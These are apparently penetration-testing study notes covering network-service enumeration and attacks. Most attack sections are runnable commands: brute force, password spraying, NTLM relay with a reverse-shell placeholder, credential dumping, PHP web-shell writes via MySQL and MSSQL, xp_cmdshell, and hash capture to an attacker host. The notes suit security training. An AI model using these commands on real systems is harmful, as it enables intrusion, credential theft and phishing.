# Content 
- [FTP](#ftp)
  - [Service Info](#service-info)
  - [Attacks](#attacks)   
- [SMB](#smb)
  - [Service Info](#service-info-1)
  - [Attacks](#attacks-1)
- [NFS](#nfs)
  - [Service Info](#service-info-2)
  - [Attacks](#attacks-2)
- [DNS](#dns)
  - [Service Info](#service-info-3)   
  - [Attacks](#attacks-3)
- [SMTP](#smtp)
  - [Service Info](#service-info-4)
  - [Attacks](#attacks-4)
- [IMAP / POP3](#imap--pop3)
  - [Service Info](#service-info-5)
  - [Attacks](#attacks-5)
- [SNMP](#snmp)
  - [Service Info](#service-info-6)
  - [Attacks](#attacks-6)


# FTP
File Transfer Protocol

## Service Info
### ports used  
- 21/TCP for control channel
- 20/TCP for data channel in active mode
- for passive mode the server tell the client which port to connect
### Dangerous Settings
| Setting                      | Description                                              |
|------------------------------|----------------------------------------------------------|
| anonymous_enable=YES         | Allowing anonymous login?                               |
| anon_upload_enable=YES       | Allowing anonymous to upload files?                     |
| anon_mkdir_write_enable=YES  | Allowing anonymous to create new directories?           |
| no_anon_password=YES         | Do not ask anonymous for password?                      |
| anon_root=/home/username/ftp| Directory for anonymous.                                 |
| write_enable=YES             | Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? |

### Footprinting the Service
- nmap 
```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136

sudo nmap -sV -p21 -sC -A 10.129.14.136 --script ftp*
```
### Service Interaction
- **Tools***
```bash
# ftp
ftp 10.129.14.136

# netcat
nc -nv 10.129.14.136 21

# telnet
telnet 10.129.14.136 21

# openssl
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```
- **commands**

| Command | Description                                                                                               |
|---------|-----------------------------------------------------------------------------------------------------------|
| connect | Sets the remote host, and optionally the port, for file transfers.                                         |
| get     | Transfers a file or set of files from the remote host to the local host.                                     |
| put     | Transfers a file or set of files from the local host onto the remote host.                                   |
| quit    | Exits tftp.                                                                                                |
| status  | Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on. |
| verbose | Turns verbose mode, which displays additional information during file transfer, on or off.                  |

- **Download All Available Files**
```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```
## Attacks 
### Bruteforce 
```bash
# hydra
hydra -l username -P /path/to/password-list.txt ftp://target-ip
hydra -L /path/to/usernames.txt -P /path/to/password-list.txt ftp://192.168.1.10

# medusa 
medusa -h target-ip -u username -P /path/to/password-list.txt -M ftp
medusa -h 192.168.1.10 -U /path/to/usernames.txt -P /path/to/password-list.txt -M ftp
```

### Anonymous Login
```bash
ftp target-ip
  Name (target-ip:your-username): anonymous
  Password: [press Enter or type any email as a password]
```

### CVEs
```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script ftp*
searchsploit 'ftp' # search for version 
```




# SMB
Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network

- `CIFS` was used as the same as SMB but now it's old and work on the same ports as SMB

## Service Info
### port used  
-  `OLD` 137, 138, and 139 TCP/UDP  on top of  `NetBIOS `
-  `NEW` 445 TCP on top of `microsoft-ds`

### Dangerous Settings
| Setting             | Description                                                   |
|---------------------|---------------------------------------------------------------|
| browseable = yes    | Allow listing available shares in the current share?          |
| read only = no      | Forbid the creation and modification of files?                |
| writable = yes      | Allow users to create and modify files?                       |
| guest ok = yes      | Allow connecting to the service without using a password?     |
| enable privileges = yes | Honor privileges assigned to specific SID?                 |
| create mask = 0777 | What permissions must be assigned to the newly created files? |
| directory mask = 0777 | What permissions must be assigned to the newly created directories? |
| logon script = script.sh | What script needs to be executed on the user's login?     |
| magic script = script.sh | Which script should be executed when the script gets closed? |
| magic output = script.out | Where the output of the magic script needs to be stored?   |


### Footprinting the Service
- nmap
```bash
 sudo nmap 10.129.14.128 -sV -sC -p139,445
```


### Service Interaction

#### **smbmap**
```bash
smbmap -H 10.129.202.5 -s sambashare
```

#### **smbclient**
```
# null session
smbclient -N -L //10.129.14.128
# using creds
smbclient //server78//publicfolder -U=user%password
#
```
- smb commands

| Command        | Description                                                  |
|----------------|--------------------------------------------------------------|
| `?`            | Displays a list of available commands or provides help.       |
| `allinfo`      | Displays detailed information about a file or directory.     |
| `cd`           | Changes the current working directory on the remote server.   |
| `get`          | Downloads a file from the remote server.                     |
| `put`          | Uploads a file to the remote server.                         |
| `ls`           | Lists the contents of the current directory on the server.   |
| `mkdir`        | Creates a new directory on the remote server.                |
| `pwd`          | Prints the current working directory on the server.          |
| `quit` (`q`)   | Exits the `smbclient` session.                               |
| RECURSE ON     | make any command recursive                                   |
| PROMPT OFF     | Turns off prompting, allowing commands like mget to process all files without asking for confirmation for each one. |
| mget *         |     download multiple files from an SMB share            |



#### rpcclient
```bash
# null session
rpcclient -U "" 10.129.14.128

# using creds
rpcclient -U "username%password" target-ip
```
- rpcclient commands

| Query               | Description                                                   |
|---------------------|---------------------------------------------------------------|
| srvinfo             | Server information.                                           |
| enumdomains         | Enumerate all domains that are deployed in the network.       |
| querydominfo        | Provides domain, server, and user information of deployed domains. |
| netshareenumall     | Enumerates all available shares.                              |
| netsharegetinfo \<share\> | Provides information about a specific share.               |
| enumdomusers        | Enumerates all domain users.                                  |
| queryuser \<RID\>     | Provides information about a specific user.                  |

## Attacks
### Bruteforce 

```bash
# metasploit
msf > use auxiliary/scanner/smb/smb_login

# hydra
hydra -l username -P /path/to/password-list.txt smb://target-ip
hydra -L /path/to/usernames.txt -P /path/to/password-list.txt smb://192.168.1.10

# medusa
medusa -h target-ip -u username -P /path/to/password-list.txt -M smbnt
medusa -h 192.168.1.10 -U /path/to/usernames.txt -P /path/to/password-list.txt -M smbnt
```
### Enumerating
```bash
# null session
## enum4linux
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
## rpcclient 
rpcclient -U "" -N 172.16.5.5
> enumdomusers 


# guest access or valid creds
netexec smb 172.16.5.5 -u "guest" -p "" --rid-brute  

# Logged-on Users
netexec smb 10.10.110.10 -u administrator -p 'Password123!' --loggedon-users


# using netexec you can enumrate 
--shares              enumerate shares and access
--interfaces          enumerate network interfaces
--no-write-check      Skip write check on shares (avoid leaving traces when missing delete permissions)
--filter-shares FILTER_SHARES [FILTER_SHARES ...]
                      Filter share by access, option 'read' 'write' or 'read,write'
--sessions            enumerate active sessions
--disks               enumerate disks
--loggedon-users-filter LOGGEDON_USERS_FILTER
                      only search for specific user, works with regex
--loggedon-users      enumerate logged on users
--users [USER ...]    enumerate domain users, if a user is specified than only its information is queried.
--groups [GROUP]      enumerate domain groups, if a group is specified than its members are enumerated
--computers [COMPUTER]
                      enumerate computer users
--local-groups [GROUP]
                      enumerate local groups, if a group is specified then its members are enumerated
--pass-pol            dump password policy
--rid-brute [MAX_RID]
                      enumerate users by bruteforcing RIDs

```

### RCE 
need admin priv
```
/usr/share/doc/python3-impacket/examples/psexec.py

/usr/share/doc/python3-impacket/examples/smbexec.py

/usr/share/doc/python3-impacket/examples/atexec.py

netexec smb 10.129.202.85 -u user.list -p password.list   -x 'whoami' --exec-method smbexec
```

### Credential Gathering

```bash
# AD admin | --local-auth  for local admin | any user with suitable pemssions
netexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
netexec smb 10.10.110.17 -u administrator -p 'Password123!' --lsa
# AD admin
netexec smb 10.10.110.17 -u administrator -p 'Password123!' --ntds

/usr/share/doc/python3-impacket/examples/samrdump.py 10.129.14.128
```

### LLMNR/NBT-NS Poisoning
- for more info check [this](https://github.com/kiro6/penetration-testing-notes/tree/main/Penetration%20Testing/Active%20Directory%20Enumeration%20%26%20Attacks#llmnrnbt-ns-poisoning)
- if we are in the same network we can pretend to be a smb server and catch the user hashes 
```
1) The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
2) If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
3) Is there no local DNS record? A query will be sent to the DNS server that has been configured.
4) If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.
```
- user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\` In that case, the machine will send a multicast query to all devices on the network

```
 responder -I <interface name>
```

### SMB relay attack
The target must not enforce or enable SMB signing.


- run responder
```
 responder -I <interface name>
```
- will capture credintials and pass it using techniques like `PtH` to another systems 
- [revshells](https://www.revshells.com/)
```shell
#  we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
cat /etc/responder/Responder.conf | grep 'SMB ='

# -t is the taregt we rely this to
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <poweshell base64 reverse shell>'

```


# NFS
- Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. 
- NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers.

## Service info

| Version | Features                                                                                                                                             |
|---------|-----------------------------------------------------------------------------------------------------------------------------------------------------|
| NFSv2   | It is older but is supported by many systems and was initially operated entirely over UDP.                                                          |
| NFSv3   | It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.                      |
| NFSv4   | It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol. |


### port used  
- Port 2049 TCP or UDP: NFS 
- Port 111 TCP or UDP : for SUN Remote Procedure Call (RPC Portmapper) which is used as portmapper and **nfs rely on it for auth**

### Auth in NFC 
- NFS itself has no built-in authentication or authorization mechanisms, Authentication is delegated to the RPC protocol's options.
#### Default NFS Authentication: UNIX UID/GID via RPC
- The server, using RPC, translates the client's UID/GID into its local file system's format to enforce access permissions based on file system rules.
#### NFS Authentication: Kerberos via RPC
- RPCSEC_GSS in NFSv4 enables Kerberos authentication, allowing the client and server to mutually authenticate each other before any file access is granted.

### Dangerous Settings

| Option          | Description                                                                                      |
|-----------------|--------------------------------------------------------------------------------------------------|
| rw              | Read and write permissions.                                                                      |
| insecure        | Ports above 1024 will be used.                                                                   |
| nohide          | If another file system was mounted below an exported directory, this directory is exported by its own exports entry. |
| no_root_squash  | All files created by root are kept with the UID/GID 0.                                           |

### Footprinting the Service
- nmap
```
sudo nmap 10.129.14.128 -p111,2049 -sV -sC --script nfs*
```
### Service Interaction
```bash
$ showmount -e 10.129.14.128

$ mkdir target-NFS
$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
$ cd target-NFS
$ tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share




$ cd ..
$ sudo umount ./target-NFS
```
## Attacks
### Brutforce 
#### pcnfs
this is a windows client to mount unix/linux 
```bash

hydra -l username -P passwords.txt pcnfs://<Target_IP>
hydra -L usernames.txt -P passwords.txt pcnfs://<Target_IP>
```
#### Kerbros for NFS4
this version can use Kerberos for auth 
```bash
# bruteforce    Bruteforce username:password combos, from a file or stdin
kerbrute bruteforce -d inlanefreight.local --dc 172.16.5.5  users.txt

# passwordspray Test a single password against a list of users
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

### uid spoof 
check [NfSpy](https://github.com/bonsaiviking/NfSpy) this only support nfsv4
```bash
sudo nfspy -o server=192.168.1.124:/home,hide,allow_other,ro,intr /mnt
```


# DNS

## Service Info

### Dangerous Settings

| Option            | Description                                                     |
|-------------------|-----------------------------------------------------------------|
| allow-query       | Defines which hosts are allowed to send requests to the DNS server. |
| allow-recursion   | Defines which hosts are allowed to send recursive requests to the DNS server. |
| allow-transfer    | Defines which hosts are allowed to receive zone transfers from the DNS server. |
| zone-statistics   | Collects statistical data of zones.                             |


### Service Interaction
- dig
- dnsenum
```bash
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

## Attacks 

### DIG - AXFR Zone Transfer 
- [fierce](https://github.com/mschwager/fierce)
```shell
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

fierce --domain zonetransfer.me # Tools like Fierce can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer
```
### Domain Takeovers & Subdomain Enumeration
- [subbrute](https://github.com/TheRook/subbrute)
- [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)
```shell
subfinder -d inlanefreight.com -v


# pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
"ns1.inlanefreight.com" > ./resolvers.txt
./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt

# after you find subdomains check for cname
dig cname example.com 

```

### DNS Spoofing & DNS Cache Poisoning
- From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/).

![Screenshot 2024-04-24 at 11-32-12 Hack The Box - Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/bfc4dc6e-5683-4607-9615-1ec087f6d82a)




# SMTP
## Service Info
### port used
- Port 25/tcp  old but gold smtp
- Port 587/tcp modern smtp support tls
- Port 465/tcp deprcated but still widly used for smtp and support tls
- Port 2525/tcp not an official SMTP port but still popularly used 

### Dangerous Settings
- open relay
```
mynetworks = 0.0.0.0/0
```
### Footprinting the Service
- nmap 
```
sudo nmap 10.129.14.128 -sC -sV -p25
sudo nmap 10.129.14.128 -sC -sV -p25 --script smtp-open-relay
```

### Service Interaction
- Telnet
```
nc <ip> <port>
telnet 10.129.14.128 25
```

- smtp commands

| Command     | Description                                            |
|-------------|--------------------------------------------------------|
| HELO        | Identifies the sender's SMTP client to the server.     |
| EHLO        | Extended HELO command providing additional capabilities.|
| MAIL FROM:  | Specifies the email address of the sender.             |
| RCPT TO:    | Specifies the email address of the recipient.          |
| DATA        | Indicates the start of the email message data.         |
| QUIT        | Terminates the SMTP session and closes the connection. |
| AUTH        | Initiates authentication process with the server.      |
| NOOP        | No-operation command, used to keep the connection alive.|
| RSET        | Resets the current session, discarding previous commands.|
| VRFY        | Verifies the existence of a specific email address.    |
| HELP        | Requests help information from the server.             |
| STARTTLS    | Initiates a secure connection using TLS encryption.    |


## Attacks

### Open Relay
```shell
sudo nmap 10.129.14.128 -sC -sV -p25 --script smtp-open-relay

# Next, we can use any mail client to connect to the mail server and send our email.
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

### Enumrate usernames
```bash
smtp-user-enum -M VRFY -U username   -t 10.129.247.222  -p 25 -w 60
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.204.164
```


### Cloud Enumeration
- [o365spray](https://github.com/0xZDH/o365spray) for microsoft
- [MailSniper](https://github.com/dafthack/MailSniper) for microsoft
- [CredKing](https://github.com/ustayready/CredKing) for gmail and okta 

```shell 
python3 o365spray.py --validate --domain msplaintext.xyz

python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz 
```

# IMAP / POP3
- **POP3 (Post Office Protocol 3):** POP3 allows email clients to download emails from a mail server to a local device, typically deleting them from the server after retrieval.
- **IMAP (Internet Message Access Protocol):** IMAP enables email clients to access and manage emails directly on the server, allowing synchronization across multiple devices without removing messages from the server.
## Service Info

### port used
- POP3 ports 110 , 995 (TLS/SSL) both of them tcp
- IMAP ports 143 , 993 (TLS/SSL) both of them tcp

### Dangerous Settings

| Setting                  | Description                                                                    |
|--------------------------|--------------------------------------------------------------------------------|
| auth_debug               | Enables all authentication debug logging.                                      |
| auth_debug_passwords     | Adjusts log verbosity, the submitted passwords, and the scheme gets logged.    |
| auth_verbose             | Logs unsuccessful authentication attempts and their reasons.                    |
| auth_verbose_passwords   | Passwords used for authentication are logged and can also be truncated.        |
| auth_anonymous_username | Specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |



### Footprinting the Service

```
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC

nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> <IP> #All are default scripts
```

### Service Interaction



```
openssl s_client -connect 10.129.14.128:pop3s

openssl s_client -connect 10.129.14.128:imaps
```


- IMAP Commands (add `a` befire every command)

| Command               | Description                                                             |
|-----------------------|-------------------------------------------------------------------------|
| LOGIN username password | User's login.                                                           |
| LIST "" *             | Lists all directories.                                                  |
| CREATE "INBOX"        | Creates a mailbox with a specified name.                                |
| DELETE "INBOX"        | Deletes a mailbox.                                                      |
| RENAME "ToRead" "Important" | Renames a mailbox.                                                   |
| LSUB "" *             | Returns a subset of names from the set of names that the User has declared as being active or subscribed. |
| SELECT INBOX          | Selects a mailbox so that messages in the mailbox can be accessed.      |
| UNSELECT INBOX        | Exits the selected mailbox.                                             |
| FETCH ID all        | Retrieves data associated with a message in the mailbox.                |
| FETCH ID BODY[]        | Retrieves email body               |
| CLOSE                 | Removes all messages with the Deleted flag set.                         |
| LOGOUT                | Closes the connection with the IMAP server.                             |

- POP3 Commands

| Command    | Description                                                     |
|------------|-----------------------------------------------------------------|
| USER username | Identifies the user.                                            |
| PASS password | Authentication of the user using its password.                  |
| STAT         | Requests the number of saved emails from the server.            |
| LIST         | Requests from the server the number and size of all emails.     |
| RETR id      | Requests the server to deliver the requested email by ID.       |
| DELE id      | Requests the server to delete the requested email by ID.        |
| CAPA         | Requests the server to display the server capabilities.         |
| RSET         | Requests the server to reset the transmitted information.       |
| QUIT         | Closes the connection with the POP3 server.                     |

## Attacks 

### Bruteforce POP3
```bash
# hydra
hydra -l username -P /path/to/password-list.txt pop3://target-ip
hydra -L /path/to/usernames.txt -P /path/to/password-list.txt pop3://192.168.1.10

# medusa 
medusa -h target-ip -u username -P /path/to/password-list.txt -M pop3
medusa -h 192.168.1.10 -U /path/to/usernames.txt -P /path/to/password-list.txt -M pop3
```

### Bruteforce IMAP
```
# hydra
hydra -l username -P /path/to/password-list.txt imap://target-ip
hydra -L /path/to/usernames.txt -P /path/to/password-list.txt imap://192.168.1.10

# medusa 
medusa -h target-ip -u username -P /path/to/password-list.txt -M imap
medusa -h 192.168.1.10 -U /path/to/usernames.txt -P /path/to/password-list.txt -M imap
```

## SNMP
- Simple Network Management Protocol (SNMP) was created to monitor network devices. 
- In addition, this protocol can also be used to handle configuration tasks and change settings remotely. 

## Service Info

**Components of SNMP:**
- SNMP Manager: The central management station responsible for monitoring and managing network devices. It sends SNMP requests to agents and receives responses.
- SNMP Agent: Software running on network devices that collects and maintains management information. Agents respond to SNMP requests from managers and can also send notifications (traps) to managers.
- MIB: Management Information Base is a collection of hierarchical data definitions that describe the managed objects in a device.  Each object has a unique identifier **(OID)** and can be read, written, or polled via SNMP. 

**Structure of OIDs:**
- OIDs are hierarchical and resemble tree-like structures.
- They consist of a sequence of integers separated by dots (e.g., 1.3.6.1.2.1.1.5).
- Each number represents a branch in the hierarchy, and the sequence navigates through the tree.


![image](https://github.com/user-attachments/assets/81c5fbdd-0639-4d4c-8a15-03f5019ad7ab)


**versions**
- SNMPv1:
  - Lacks built-in authentication and encryption.
  - Vulnerable to unauthorized access and interception of data.
  - Still used in some small networks but considered insecure for larger or sensitive environments.
- SNMPv2 (SNMPv2c):
  - use **community strings** for auth.
  - Community strings transmitted in plain text, lacking encryption.
- SNMPv3:
  - Introduces authentication using username and password.
  - Supports transmission encryption via pre-shared key.


### port used
- port 161/UDP to transmit control commands
- port 162/UDB send notifications sent by agents to managers

### Dangerous Settings

| Setting              | Description                                                                                  |
|----------------------|----------------------------------------------------------------------------------------------|
| rwuser noauth        | Provides access to the full OID tree without authentication.                                 |
| rwcommunity `community string` `IPv4 address` | Provides access to the full OID tree regardless of where the requests were sent from.  |
| rwcommunity6 `community string` `IPv6 address` | Same access as with rwcommunity with the difference of using IPv6.                   |

### Footprinting the Service

## Attacks

### Bruteforce users and password (SNMPv3)
- check [snmpwn](https://github.com/hatlord/snmpwn)
```bash
./snmpwn.rb --hosts hosts.txt --users users.txt --passlist passwords.txt --enclist passwords.txt
```

### Bruteforce community string (SNMPv2)
- OneSixtyOne 
```
onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
```

### Bruteforce OIDs
we need valid community string
```
braa <community string>@<ip>:.1.3.6.*
```

### retrive info

```
snmpwalk -v2c -c public 10.129.14.128 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

### RCE
check [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce)

# MySQL

## Service Info

### port used
- Port 3306/tcp default
### Dangerous Settings

| Setting          | Description                                                                                          |
|------------------|------------------------------------------------------------------------------------------------------|
| user             | Sets which user the MySQL service will run as.                                                       |
| password         | Sets the password for the MySQL user.                                                                |
| admin_address    | The IP address on which to listen for TCP/IP connections on the administrative network interface.    |
| debug            | Indicates the current debugging settings.                                                            |
| sql_warnings     | Controls whether single-row INSERT statements produce an information string if warnings occur.       |
| secure_file_priv | Used to limit the effect of data import and export operations.                                        |

### Footprinting the Service
- nmap
```
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
### Service Interaction
- mysql
```
mysql -u root -h 10.129.14.132
```
## Attacks
### Brutetforce
```bash
# hydra
hydra -l username -P /path/to/password-list.txt mysql://target-ip
hydra -L /path/to/usernames.txt -P /path/to/password-list.txt mysql://192.168.1.10

# medusa
medusa -h target-ip -u username -P /path/to/password-list.txt -M mysql
medusa -h 192.168.1.10 -U /path/to/usernames.txt -P /path/to/password-list.txt -M mysql
```
### Read local files
```mysql
# Find which directories can be accessed through MySQL, Null nothing is accessible. Dir name which onlt accessible , empty every thing accessible
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

SELECT LOAD_FILE("/etc/passwd")
```
### Write local files
```mysql
# Find which directories can be accessed through MySQL, Null nothing is accessible. Dir name which onlt accessible , empty every thing accessible
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'
```

# MSSQL

## Service Info
### port used
- Port  1433/TCP
### Dangerous Settings
- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of named pipes
- Weak & default sa credentials. Admins may forget to disable this account
### Footprinting the Service
- nmap
```bash
$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```
- mssql_ping  metaspolit

## Attacks
- check [PowerUpSQL-Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

### Brutetforce
```bash
# hydra
hydra -l username -P /path/to/password-list.txt mssql://target-ip
hydra -L /path/to/usernames.txt -P /path/to/password-list.txt mssql://192.168.1.10

# medusa
medusa -h target-ip -u username -P /path/to/password-list.txt -M mssql
medusa -h 192.168.1.10 -U /path/to/usernames.txt -P /path/to/password-list.txt -M mssql
```

### RCE 
```shell
xp_cmdshell whoami

# enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

### Write Local Files
```shell
# Enable Ole Automation Procedures to write files
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# create file
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### Read Local Files
```shell
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

### Capture MSSQL Service Hash
```shell
EXEC master..xp_dirtree '\\<attcker ip>\share\'

EXEC master..xp_subdirs '\\<attcker ip>\share\'
```
open the responder or  impacket
```
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
```
catch the whole hash 
![Screenshot_17](https://github.com/kiro6/penetration-testing-notes/assets/57776872/4eb852f0-5a37-4d2e-bafc-c40afaf7bcef)

### Impersonate Existing Users with MSSQL
prefereed to move the master DB using `USE master`
```shell 
# Identify Users that We Can Impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

# Verifying our Current User and Role
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

# Impersonating the amother user User
EXECUTE AS LOGIN = 'another user'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

```

### Communicate with Other Databases with MSSQL
```shell
# Identify linked Servers in MSSQL
SELECT srvname, isremote FROM sysservers

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

# where 1 means is a remote server

# identify the user used for the connection and its privileges.
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```


